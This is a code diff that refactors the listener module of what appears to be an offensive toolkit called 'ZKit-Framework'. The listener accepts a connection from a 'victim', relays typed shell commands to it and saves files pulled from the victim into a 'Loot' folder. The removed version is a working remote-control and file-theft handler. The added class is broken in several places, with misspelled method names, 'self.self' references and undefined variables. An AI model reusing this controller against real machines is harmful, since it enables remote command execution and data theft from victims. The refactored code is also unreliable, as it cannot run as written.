@@ -1,48 +1,70 @@
-def connect(Connection_Type: str, port: int, type: str):
-    import socket
-    import os
-    from os import path
-    import sys
-    if os.name == 'nt':
-        from colorama import init
-        init(convert=True)
-    sys.path.insert(0, path.dirname(path.dirname(path.dirname(__file__))))
-    from core.helper_core import Color
-    black, red, green, yellow, blue, magenta, cyan, grey, reset = Color().GetAllColors()
-    if Connection_Type == "TCP":
-        Connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    elif Connection_Type == "UDP":
-        Connection = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+import socket
+import os
+from os import path
 
-    print("[" + blue + 'REPORT' + reset + "]  Making Connection")
-    try:
-        Connection.bind(('', int(port)))
-        Connection.listen()
-        Victim, Address = Connection.accept()
+if os.name == 'nt':
+    from colorama import init
+    init(convert=True)
 
-        os = Victim.recv(1024).decode('UTF-8')
-        print("[" + blue + 'REPORT' + reset + "]  Got Platfrom from victim")
-        Connected = True
-        while Connected:
-            print("{}@{} : ".format(Address, os), end='')
-            Command = str(input(""))
-            Connection.send(Command.encode("UTF-8"))
-            result = Connection.recv(1024).decode("UTF-8")
-            if type == 'ft':
-                if result == '!!!':
-                    filelen = Connection.recv(1024).decode("UTF-8")
-                    filedata = Connection.recv(int(filelen) + 100)
-                    file = Connection.recv(1024).decode("UTF-8")
-                    file = path.dirname(path.dirname(
-                        path.dirname(__file__))) + '\\Loot\\' + file
-                    print(
-                        "ZKit-Framework got file from victim ({}) . writing it in {}".format(Address, file))
-                    with open(file, 'wb') as f:
-                        f.write(filedata)
-                    print("Operation was Succesful (file {})".format(file))
-            else:
-                print(result)
-    except:
-        Connected = False
-        print("[" + red + '-' + reset +
-              "] Connection Failed.Victim Might Be Offline Try Again Later")
+from core.helper_core import notify
+
+
+class Controller:
+    def __init__(self, conn_type, port, type_):
+
+        notify("notify", "Making Connection", "")
+
+        try:
+            self.get_socket(conn_type)
+            self.make_the_connection()
+            os = self.conn.recv(1024).decode('UTF-8')
+            print(f"Victim is using {os}")
+            notify("report", "Got Platfrom from victim", flush=True)
+            connected = True
+            while connected:
+                print("{}@{} : ".format(Address, os), end='')
+                command = str(input(""))
+                self.conn.send(command.encode("UTF-8"))
+                self.show_the_result()
+
+        except:
+            connected = False
+            notify("problem",
+                   "self.conn Failed.Victim Might Be Offline Try Again Later")
+
+    def show_the_result(self):
+        result = self.conn.recv(1024).decode("UTF-8")
+        if type_ == 'ft':
+            if result == '!!!':
+                self.recv_file()
+        else:
+            print(result)
+
+    def recv_file(self):
+        filelen = self.conn.recv(1024).decode("UTF-8")
+        filedata = self.conn.recv(int(filelen) + 100)
+        file = self.conn.recv(1024).decode("UTF-8")
+        file = path.dirname(path.dirname(
+            path.dirname(__file__))) + '\\Loot\\' + file
+        print(
+            "ZKit-Framework got file from victim ({}) . writing it in {}".format(Address, file))
+        with open(file, 'wb') as f:
+            f.write(filedata)
+        print("Operation was Succesful (file {})".format(file))
+
+    def make_the_connnection(self):
+        self.self.connection.bind(('', int(port)))
+        self.self.conn.listen()
+        self.conn, self.address = self.self.conn.accept()
+
+    def get_socket(self, conn_type):
+        if conn_type == "TCP":
+            self.self.connection = socket.socket(
+                socket.AF_INET, socket.SOCK_STREAM)
+        elif self.conn_Type == "UDP":
+            self.self.connection = socket.socket(
+                socket.AF_INET, socket.SOCK_DGRAM)
+
+
+def connect(conn_type: str, port: int, type_: str):
+    Controller().connect(self.conn_type, port, type_)
